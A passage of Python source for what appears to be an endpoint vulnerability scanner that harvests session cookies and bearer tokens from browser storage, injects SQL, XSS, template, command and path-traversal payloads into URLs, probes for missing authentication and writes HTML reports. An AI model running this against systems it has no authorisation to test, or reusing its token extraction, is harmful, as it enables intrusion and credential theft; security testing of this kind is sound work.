        cookies = await context.cookies()
        if cookies:
            headers["Cookie"] = "; ".join(
                f"{c['name']}={c['value']}" for c in cookies
            )

        try:
            token = await page.evaluate("""() => {
                for (const store of [localStorage, sessionStorage]) {
                    for (let i = 0; i < store.length; i++) {
                        const key = store.key(i);
                        const val = store.getItem(key);
                        if (/token|auth|jwt|bearer|access/i.test(key) && val && val.length > 20) {
                            try { return JSON.parse(val); } catch(e) { return val; }
                        }
                    }
                }
                return null;
            }""")
            if token:
                headers["Authorization"] = f"Bearer {token}"
                _p("  Found bearer token in browser storage")
        except Exception:
            pass

        await context.close()
        await browser.close()

    auth_parts = []
    if "Cookie" in headers:
        auth_parts.append("Cookie")
    if "Authorization" in headers:
        auth_parts.append("Bearer token")
    _p(f"  Auth complete -- extracted {' + '.join(auth_parts) if auth_parts else 'nothing'}")
    return headers


def parse_manual_headers(header_args: list[str]) -> dict:
    """Parse -H 'Key: Value' arguments into a headers dict."""
    headers = {}
    for h in header_args:
        if ":" in h:
            key, _, val = h.partition(":")
            headers[key.strip()] = val.strip()
    return headers


# ─────────────────────────── injection targets ────────────────────────────────

def _get_path_segments(url: str) -> list[str]:
    """Get non-static path segments that could be injection targets."""
    path = urlparse(url).path
    segments = [s for s in path.split("/") if s]
    return segments


def _inject_into_path(url: str, segment_idx: int, payload: str) -> str:
    """Replace a specific path segment with a payload."""
    parsed = urlparse(url)
    segments = parsed.path.split("/")
    # segments[0] is '' (leading slash), real segments start at 1
    real_idx = 0
    for i, seg in enumerate(segments):
        if not seg:
            continue
        if real_idx == segment_idx:
            segments[i] = payload
            break
        real_idx += 1
    new_path = "/".join(segments)
    return urlunparse(parsed._replace(path=new_path))


def _inject_into_query(url: str, param_name: str, payload: str) -> str:
    """Replace or add a query parameter with a payload."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param_name] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


# ─────────────────────────── testing engine ───────────────────────────────────

async def send_request(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    headers: dict,
    timeout: float,
    body: str | None = None,
) -> dict:
    """Send an HTTP request and return a normalized response dict."""
    start = time.monotonic()
    try:
        kwargs = {"headers": headers, "timeout": timeout}
        if body is not None and method in ("POST", "PUT", "PATCH"):
            kwargs["content"] = body
            if "Content-Type" not in headers:
                kwargs["headers"] = {**headers, "Content-Type": "application/json"}

        r = await getattr(client, method.lower())(url, **kwargs)
        elapsed = (time.monotonic() - start) * 1000

        resp_body = r.text[:100_000]  # Cap at 100KB
        resp_headers = {k.lower(): v for k, v in r.headers.items()}

        return {
            "status_code": r.status_code,
            "body": resp_body,
            "headers": resp_headers,
            "response_time_ms": elapsed,
            "error": None,
        }
    except httpx.TimeoutException:
        elapsed = (time.monotonic() - start) * 1000
        return {
            "status_code": 0,
            "body": "",
            "headers": {},
            "response_time_ms": elapsed,
            "error": "timeout",
        }
    except Exception as e:
        elapsed = (time.monotonic() - start) * 1000
        return {
            "status_code": 0,
            "body": "",
            "headers": {},
            "response_time_ms": elapsed,
            "error": str(e),
        }


async def test_route(
    client: httpx.AsyncClient,
    route: dict,
    resolved_url: str,
    auth_headers: dict,
    injectors: list[BaseInjector],
    full_mode: bool,
    auth_test: bool,
    timeout: float,
    delay: float,
    semaphore: asyncio.Semaphore,
) -> RouteResult:
    """Test a single route with all enabled injectors."""
    result = RouteResult(
        url=route["url"],
        resolved_url=resolved_url,
        method=route["method"],
        sources=route.get("sources", []),
    )

    method = route["method"]

    async with semaphore:
        # ── Baseline request ──
        baseline = await send_request(client, method, resolved_url, auth_headers, timeout)
        if delay > 0:
            await asyncio.sleep(delay)

        if baseline["error"]:
            result.unreachable = True
            return result

        result.baseline_status = baseline["status_code"]
        result.baseline_time_ms = baseline["response_time_ms"]
        result.baseline_content_type = baseline["headers"].get("content-type", "")

        # ── Auth bypass test ──
        if auth_test:
            no_auth_resp = await send_request(client, method, resolved_url, {}, timeout)
            if delay > 0:
                await asyncio.sleep(delay)

            if no_auth_resp["status_code"] == baseline["status_code"] == 200:
                if no_auth_resp["body"] == baseline["body"]:
                    result.auth_required = False
                    result.findings.append(Finding(
                        injector="auth",
                        risk="high",
                        confidence="high",
                        title="No authentication required",
                        payload="(stripped all auth headers)",
                        injection_point="headers",
                        target_param="Authorization/Cookie",
                        evidence="Response identical to authenticated request",
                        baseline_status=baseline["status_code"],
                        test_status=no_auth_resp["status_code"],
                        test_time_ms=no_auth_resp["response_time_ms"],
                    ))
                else:
                    result.auth_required = False
                    result.findings.append(Finding(
                        injector="auth",
                        risk="medium",
                        confidence="medium",
                        title="Possible auth bypass -- different response without auth",
                        payload="(stripped all auth headers)",
                        injection_point="headers",
                        target_param="Authorization/Cookie",
                        evidence=f"200 OK without auth (body differs: {len(no_auth_resp['body'])} vs {len(baseline['body'])} bytes)",
                        baseline_status=baseline["status_code"],
                        test_status=no_auth_resp["status_code"],
                        test_time_ms=no_auth_resp["response_time_ms"],
                    ))
            elif no_auth_resp["status_code"] in (401, 403):
                result.auth_required = True

        # ── Determine injection targets ──
        path_segments = _get_path_segments(resolved_url)
        parsed = urlparse(resolved_url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        # ── Run each injector ──
        for injector in injectors:
            payloads = injector.full_payloads() if full_mode else injector.quick_payloads()

            for payload in payloads:
                # Inject into path segments (last 3 non-static segments)
                injectable_segments = []
                for i, seg in enumerate(path_segments):
                    # Skip segments that look like fixed API paths
                    if seg in ("api", "v1", "v2", "v3", "auth", "me", "config",
                               "internal", "ping", "onboarding"):
                        continue
                    injectable_segments.append(i)

                # Test last 2 injectable path segments to keep it reasonable
                for seg_idx in injectable_segments[-2:]:
                    test_url = _inject_into_path(resolved_url, seg_idx, payload)
                    resp = await send_request(client, method, test_url, auth_headers, timeout)
                    result.tests_run += 1
                    if delay > 0:
                        await asyncio.sleep(delay)

                    finding = injector.analyze(baseline, resp, payload)
                    if finding:
                        seg_name = path_segments[seg_idx] if seg_idx < len(path_segments) else "?"
                        result.findings.append(Finding(
                            injector=injector.name,
                            risk=finding["risk"],
                            confidence=finding["confidence"],
                            title=f"{injector.display_name} (path: /{seg_name})",
                            payload=payload,
                            injection_point="path",
                            target_param=f"/{seg_name}",
                            evidence=finding["evidence"],
                            baseline_status=baseline["status_code"],
                            test_status=resp["status_code"],
                            test_time_ms=resp["response_time_ms"],
                        ))

                # Inject into query params
                if query_params:
                    for param_name in list(query_params.keys())[:3]:
                        test_url = _inject_into_query(resolved_url, param_name, payload)
                        resp = await send_request(client, method, test_url, auth_headers, timeout)
                        result.tests_run += 1
                        if delay > 0:
                            await asyncio.sleep(delay)

                        finding = injector.analyze(baseline, resp, payload)
                        if finding:
                            result.findings.append(Finding(
                                injector=injector.name,
                                risk=finding["risk"],
                                confidence=finding["confidence"],
                                title=f"{injector.display_name} (query: {param_name})",
                                payload=payload,
                                injection_point="query",
                                target_param=param_name,
                                evidence=finding["evidence"],
                                baseline_status=baseline["status_code"],
                                test_status=resp["status_code"],
                                test_time_ms=resp["response_time_ms"],
                            ))

                # For GET with no query params, add a test param
                if method == "GET" and not query_params:
                    test_url = _inject_into_query(resolved_url, "q", payload)
                    resp = await send_request(client, method, test_url, auth_headers, timeout)
                    result.tests_run += 1
                    if delay > 0:
                        await asyncio.sleep(delay)

                    finding = injector.analyze(baseline, resp, payload)
                    if finding:
                        result.findings.append(Finding(
                            injector=injector.name,
                            risk=finding["risk"],
                            confidence=finding["confidence"],
                            title=f"{injector.display_name} (query: q)",
                            payload=payload,
                            injection_point="query",
                            target_param="q",
                            evidence=finding["evidence"],
                            baseline_status=baseline["status_code"],
                            test_status=resp["status_code"],
                            test_time_ms=resp["response_time_ms"],
                        ))

    return result


# ─────────────────────────── HTML report ──────────────────────────────────────

def generate_html_report(scan_data: dict) -> str:
    """Generate a self-contained HTML report with dark theme."""
    summary = scan_data["summary"]
    config = scan_data["config"]

    # Build findings rows
    findings_rows = ""
    finding_id = 0
    for route in scan_data["routes"]:
        for f in route.get("findings", []):
            finding_id += 1
            sev_class = f["risk"]
            findings_rows += f"""
            <tr class="finding-row" onclick="toggleDetail('detail-{finding_id}')">
                <td><span class="badge badge-{sev_class}">{html_mod.escape(f['risk'].upper())}</span></td>
                <td>{html_mod.escape(f['injector'])}</td>
                <td><code>{html_mod.escape(route['method'])} {html_mod.escape(route['url'])}</code></td>
                <td>{html_mod.escape(f['title'])}</td>
                <td><span class="badge badge-conf-{f['confidence']}">{html_mod.escape(f['confidence'])}</span></td>
            </tr>
            <tr class="detail-row" id="detail-{finding_id}" style="display:none">
                <td colspan="5">
                    <div class="detail-box">
                        <div class="detail-grid">
                            <div><strong>Resolved URL:</strong> <code>{html_mod.escape(route.get('resolved_url', route['url']))}</code></div>
                            <div><strong>Injection Point:</strong> {html_mod.escape(f['injection_point'])} &rarr; <code>{html_mod.escape(f['target_param'])}</code></div>
                            <div><strong>Payload:</strong> <code class="payload">{html_mod.escape(f['payload'])}</code></div>
                            <div><strong>Baseline Status:</strong> {f['baseline_status']} &rarr; <strong>Test Status:</strong> {f['test_status']}</div>
                            <div><strong>Response Time:</strong> {f['test_time_ms']:.0f}ms</div>
                            <div><strong>Evidence:</strong> {html_mod.escape(f['evidence'])}</div>
                        </div>
                    </div>
                </td>
            </tr>"""

    # Build route coverage rows
    coverage_rows = ""
    for route in scan_data["routes"]:
        if route.get("unreachable"):
            status_badge = '<span class="badge badge-unreachable">UNREACHABLE</span>'
        elif route.get("findings"):
            count = len(route["findings"])
            max_sev = "low"
            for f in route["findings"]:
                if f["risk"] == "critical":
                    max_sev = "critical"
                    break
                elif f["risk"] == "high" and max_sev != "critical":
                    max_sev = "high"
                elif f["risk"] == "medium" and max_sev not in ("critical", "high"):
                    max_sev = "medium"
            status_badge = f'<span class="badge badge-{max_sev}">{count} FINDING{"S" if count > 1 else ""}</span>'
        else:
            status_badge = '<span class="badge badge-clean">CLEAN</span>'

        coverage_rows += f"""
        <tr>
            <td><code>{html_mod.escape(route['method'])}</code></td>
            <td><code>{html_mod.escape(route['url'])}</code></td>
            <td>{status_badge}</td>
            <td>{route.get('tests_run', 0)}</td>
            <td>{route.get('baseline', {}).get('status', '-')}</td>
        </tr>"""

    # Severity counts for chart
    by_sev = summary.get("by_severity", {})
    crit = by_sev.get("critical", 0)
    high = by_sev.get("high", 0)
    med = by_sev.get("medium", 0)
    low = by_sev.get("low", 0)
    total_findings = summary.get("findings", 0)

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Endpoint Security Scan - {html_mod.escape(scan_data.get('target', ''))}</title>
<style>
:root {{
    --bg: #0f1117;
    --surface: #1a1d27;
    --surface2: #242736;
    --border: #2e3248;
    --text: #e2e4ea;
    --text-dim: #8b8fa3;
    --critical: #ff4757;
    --high: #ff6b35;
    --medium: #ffa502;
    --low: #5b9bd5;
    --clean: #2ed573;
    --accent: #7c5cff;
}}
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{
    background: var(--bg);
    color: var(--text);
    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
    font-size: 13px;
    line-height: 1.6;
    padding: 24px;
}}
.container {{ max-width: 1400px; margin: 0 auto; }}
h1 {{ font-size: 22px; font-weight: 600; margin-bottom: 4px; color: var(--accent); }}
h2 {{ font-size: 16px; font-weight: 600; margin: 32px 0 16px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 8px; }}
.header {{ margin-bottom: 32px; }}
.header .meta {{ color: var(--text-dim); font-size: 12px; margin-top: 4px; }}
.summary-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 12px;
    margin-bottom: 24px;
}}
.summary-card {{
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
    text-align: center;
}}
.summary-card .value {{ font-size: 28px; font-weight: 700; }}
.summary-card .label {{ color: var(--text-dim); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }}
.severity-bar {{
    display: flex;
    height: 28px;
    border-radius: 6px;
    overflow: hidden;
    margin-bottom: 24px;
    background: var(--surface);
}}
.severity-bar .seg {{
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 11px;
    font-weight: 600;
    color: #fff;
    min-width: 40px;
    transition: flex 0.3s;
}}
.seg-critical {{ background: var(--critical); }}
.seg-high {{ background: var(--high); }}
.seg-medium {{ background: var(--medium); }}
.seg-low {{ background: var(--low); }}
.seg-clean {{ background: var(--clean); flex: 1; color: var(--bg); }}
table {{
    width: 100%;
    border-collapse: collapse;
    background: var(--surface);
    border-radius: 8px;
    overflow: hidden;
}}
th {{
    background: var(--surface2);
    padding: 10px 12px;
    text-align: left;
    font-weight: 600;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    color: var(--text-dim);
    border-bottom: 1px solid var(--border);
}}
td {{
    padding: 8px 12px;
    border-bottom: 1px solid var(--border);
    vertical-align: top;
}}
.finding-row {{ cursor: pointer; transition: background 0.15s; }}
.finding-row:hover {{ background: var(--surface2); }}
code {{
    background: var(--surface2);
    padding: 2px 6px;
    border-radius: 3px;
    font-size: 12px;
}}
.payload {{ color: var(--critical); background: rgba(255,71,87,0.1); }}
.badge {{
    display: inline-block;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}}
.badge-critical {{ background: rgba(255,71,87,0.15); color: var(--critical); }}
.badge-high {{ background: rgba(255,107,53,0.15); color: var(--high); }}
.badge-medium {{ background: rgba(255,165,2,0.15); color: var(--medium); }}
.badge-low {{ background: rgba(91,155,213,0.15); color: var(--low); }}
.badge-clean {{ background: rgba(46,213,115,0.15); color: var(--clean); }}
.badge-unreachable {{ background: rgba(139,143,163,0.15); color: var(--text-dim); }}
.badge-conf-high {{ background: rgba(46,213,115,0.15); color: var(--clean); }}
.badge-conf-medium {{ background: rgba(255,165,2,0.15); color: var(--medium); }}
.badge-conf-low {{ background: rgba(91,155,213,0.15); color: var(--low); }}
.detail-box {{
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 16px;
    margin: 4px 0;
}}
.detail-grid {{ display: grid; gap: 8px; }}
.detail-grid div {{ line-height: 1.8; }}
.config-info {{
    display: flex;
    gap: 16px;
    flex-wrap: wrap;
    color: var(--text-dim);
    font-size: 12px;
    margin-top: 8px;
}}
.config-info span {{ background: var(--surface); padding: 2px 8px; border-radius: 4px; }}
</style>
</head>
<body>
<div class="container">

<div class="header">
    <h1>Endpoint Security Scan Report</h1>
    <div class="meta">
        Target: <strong>{html_mod.escape(scan_data.get('target', ''))}</strong>
        &nbsp;|&nbsp; Scan Date: {html_mod.escape(scan_data.get('scan_date', '')[:19])}
        &nbsp;|&nbsp; Crawl File: {html_mod.escape(scan_data.get('crawl_file', ''))}
    </div>
    <div class="config-info">
        <span>Mode: {html_mod.escape(config.get('mode', 'quick'))}</span>
        <span>Injectors: {html_mod.escape(', '.join(config.get('injectors', [])))}</span>
        <span>Concurrency: {config.get('max_concurrent', 5)}</span>
        <span>Delay: {config.get('delay', 0.5)}s</span>
    </div>
</div>

<h2>Executive Summary</h2>
<div class="summary-grid">
    <div class="summary-card"><div class="value">{summary.get('total_routes', 0)}</div><div class="label">Total Routes</div></div>
    <div class="summary-card"><div class="value">{summary.get('routes_tested', 0)}</div><div class="label">Tested</div></div>
    <div class="summary-card"><div class="value">{summary.get('routes_unreachable', 0)}</div><div class="label">Unreachable</div></div>
    <div class="summary-card"><div class="value">{summary.get('total_tests', 0)}</div><div class="label">Total Tests</div></div>
    <div class="summary-card"><div class="value" style="color:{'var(--critical)' if total_findings > 0 else 'var(--clean)'}">{total_findings}</div><div class="label">Findings</div></div>
</div>

<div class="severity-bar">
    {"" if crit == 0 else f'<div class="seg seg-critical" style="flex:{crit}">C:{crit}</div>'}
    {"" if high == 0 else f'<div class="seg seg-high" style="flex:{high}">H:{high}</div>'}
    {"" if med == 0 else f'<div class="seg seg-medium" style="flex:{med}">M:{med}</div>'}
    {"" if low == 0 else f'<div class="seg seg-low" style="flex:{low}">L:{low}</div>'}
    {"" if total_findings > 0 else '<div class="seg seg-clean">ALL CLEAN</div>'}
</div>

<h2>Findings ({total_findings})</h2>
{"<p style='color:var(--clean);margin-bottom:16px'>No vulnerabilities detected.</p>" if total_findings == 0 else f"""
<table>
<thead><tr>
    <th>Severity</th><th>Category</th><th>Endpoint</th><th>Title</th><th>Confidence</th>
</tr></thead>
<tbody>{findings_rows}</tbody>
</table>"""}

<h2>Route Coverage ({summary.get('routes_tested', 0)}/{summary.get('total_routes', 0)})</h2>
<table>
<thead><tr>
    <th>Method</th><th>URL Pattern</th><th>Status</th><th>Tests</th><th>Baseline</th>
</tr></thead>
<tbody>{coverage_rows}</tbody>
</table>

</div>

<script>
function toggleDetail(id) {{
    const el = document.getElementById(id);
    el.style.display = el.style.display === 'none' ? 'table-row' : 'none';
}}
</script>
</body>
</html>"""


# ─────────────────────────── main scanner ─────────────────────────────────────

async def main():
    ap = argparse.ArgumentParser(
        description="Standalone endpoint security scanner. "
                    "Reads a deep_crawl JSON and tests every endpoint for vulnerabilities.",
    )
    ap.add_argument("crawl_file", help="Path to deep_crawl JSON file")
    ap.add_argument("--backend", "-b", default="http://127.0.0.1:8000",
                    help="Backend API URL for credential lookup (default: http://127.0.0.1:8000)")
    ap.add_argument("--skip-auth", action="store_true",
                    help="Skip browser login, use manual headers instead")
    ap.add_argument("--header", "-H", action="append", default=[],
                    help='Manual auth headers (repeatable), e.g. -H "Authorization: Bearer xxx"')
    ap.add_argument("--injectors", default="sql,xss,ssti,cmd,traversal",
                    help="Comma-separated injector types (default: sql,xss,ssti,cmd,traversal)")
    ap.add_argument("--full", action="store_true",
                    help="Use full payload sets (25-40 per injector). Default is quick mode (3 per injector)")
    ap.add_argument("--max-concurrent", type=int, default=5,
                    help="Max parallel requests (default: 5)")
    ap.add_argument("--delay", type=float, default=0.5,
                    help="Seconds between requests (default: 0.5)")
    ap.add_argument("--timeout", type=float, default=10,
                    help="Per-request timeout in seconds (default: 10)")
    ap.add_argument("--output", "-o", default=None,
                    help="Output prefix (default: scan_<workspace_id>)")
    ap.add_argument("--auth-test", action="store_true",
                    help="Also test each endpoint for auth bypass")
    args = ap.parse_args()

    # ── Load crawl data ──
    try:
        with open(args.crawl_file, "r", encoding="utf-8") as f:
            crawl_data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        _p(f"Failed to load crawl file: {e}", error=True)
        sys.exit(1)

    routes = crawl_data.get("routes", [])
    discovered_ids = crawl_data.get("discovered_ids", {})
    workspace_id = crawl_data.get("workspace_id", "unknown")
    start_url = crawl_data.get("start_url", "")
    target_domains = crawl_data.get("target_domains", [])

    _p(f"Loaded {len(routes)} routes from {args.crawl_file}")

    # ── Set up injectors ──
    injector_names = [n.strip() for n in args.injectors.split(",")]
    injectors = []
    for name in injector_names:
        if name in ALL_INJECTORS:
            injectors.append(ALL_INJECTORS[name]())
        else:
            _p(f"Unknown injector: {name}", error=True)
            sys.exit(1)

    _p(f"Injectors: {', '.join(i.name for i in injectors)} ({'full' if args.full else 'quick'} mode)")

    # ── Authentication ──
    if args.skip_auth:
        auth_headers = parse_manual_headers(args.header)
        if auth_headers:
            _p(f"Using manual headers: {', '.join(auth_headers.keys())}")
        else:
            _p("No auth headers provided (running unauthenticated)")
    else:
        auth_headers = await authenticate_browser(start_url, args.backend)
        # Merge any manual headers on top
        for h in args.header:
            if ":" in h:
                key, _, val = h.partition(":")
                auth_headers[key.strip()] = val.strip()

    # ── Resolve {id} placeholders ──
    resolved_routes = []
    unresolvable = 0
    for route in routes:
        resolved = resolve_url(route["url"], discovered_ids)
        if resolved:
            resolved_routes.append((route, resolved))
        else:
            unresolvable += 1

    _p(f"Resolved {{id}} placeholders for {len(resolved_routes)} routes ({unresolvable} unresolvable)")

    # ── Run scan ──
    mode_label = "full" if args.full else "quick"
    _p(f"Starting scan: {len(injectors)} injectors x {mode_label} mode x {len(resolved_routes)} routes")

    semaphore = asyncio.Semaphore(args.max_concurrent)
    all_results: list[RouteResult] = []

    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        for idx, (route, resolved_url) in enumerate(resolved_routes, 1):
            result = await test_route(
                client=client,
                route=route,
                resolved_url=resolved_url,
                auth_headers=auth_headers,
                injectors=injectors,
                full_mode=args.full,
                auth_test=args.auth_test,
                timeout=args.timeout,
                delay=args.delay,
                semaphore=semaphore,
            )
            all_results.append(result)

            # Progress output
            padded_method = result.method.ljust(6)
            padded_url = result.url[:60].ljust(60)
            if result.unreachable:
                status = "- unreachable"
            elif result.findings:
                max_risk = "low"
                for f in result.findings:
                    if f.risk == "critical":
                        max_risk = "critical"
                        break
                    elif f.risk == "high":
                        max_risk = "high"
                    elif f.risk == "medium" and max_risk == "low":
                        max_risk = "medium"
                count = len(result.findings)
                status = f"!! {count} finding{'s' if count > 1 else ''} ({max_risk})"
            else:
                status = "ok clean"

            _p(f"  [{idx:>3}/{len(resolved_routes)}] {padded_method} {padded_url} {status}")

    # ── Build output ──
    total_tests = sum(r.tests_run for r in all_results)
    all_findings = []
    by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    by_category = {}

    for r in all_results:
        for f in r.findings:
            by_severity[f.risk] = by_severity.get(f.risk, 0) + 1
            cat = f.injector
            by_category[cat] = by_category.get(cat, 0) + 1
            all_findings.append(f)

    routes_tested = sum(1 for r in all_results if not r.unreachable)
    routes_unreachable = sum(1 for r in all_results if r.unreachable)

    scan_output = {
        "scan_date": datetime.now(timezone.utc).isoformat(),
        "crawl_file": args.crawl_file,
        "target": start_url,
        "target_domains": target_domains,
        "config": {
            "injectors": injector_names,
            "mode": "full" if args.full else "quick",
            "max_concurrent": args.max_concurrent,
            "delay": args.delay,
        },
        "summary": {
            "total_routes": len(routes),
            "routes_tested": routes_tested,
            "routes_unreachable": routes_unreachable,
            "total_tests": total_tests,
            "findings": len(all_findings),
            "by_severity": by_severity,
            "by_category": by_category,
        },
        "routes": [],
    }

    for r in all_results:
        route_entry = {
            "url": r.url,
            "resolved_url": r.resolved_url,
            "method": r.method,
            "sources": r.sources,
            "baseline": {
                "status": r.baseline_status,
                "time_ms": round(r.baseline_time_ms, 1),
                "content_type": r.baseline_content_type,
            },
            "unreachable": r.unreachable,
            "auth_required": r.auth_required,
            "tests_run": r.tests_run,
            "findings": [
                {
                    "injector": f.injector,
                    "risk": f.risk,
                    "confidence": f.confidence,
                    "title": f.title,
                    "payload": f.payload,
                    "injection_point": f.injection_point,
                    "target_param": f.target_param,
                    "evidence": f.evidence,
                    "baseline_status": f.baseline_status,
                    "test_status": f.test_status,
                    "test_time_ms": round(f.test_time_ms, 1),
                }
                for f in r.findings
            ],
        }
        scan_output["routes"].append(route_entry)

    # ── Write output files ──
    prefix = args.output or f"scan_{workspace_id[:8]}"
    json_path = f"{prefix}.json"
    html_path = f"{prefix}.html"

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(scan_output, f, indent=2)

    html_content = generate_html_report(scan_output)
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html_content)

    # ── Summary ──
    _p(f"\nScan complete: {routes_tested} routes tested, {len(all_findings)} findings")
    if by_severity["critical"]:
        _p(f"  CRITICAL: {by_severity['critical']}")
    if by_severity["high"]:
        _p(f"  HIGH:     {by_severity['high']}")
    if by_severity["medium"]:
        _p(f"  MEDIUM:   {by_severity['medium']}")
    if by_severity["low"]:
        _p(f"  LOW:      {by_severity['low']}")
    _p(f"Results: {json_path}")
    _p(f"Report:  {html_path}")


if __name__ == "__main__":
    asyncio.run(main())
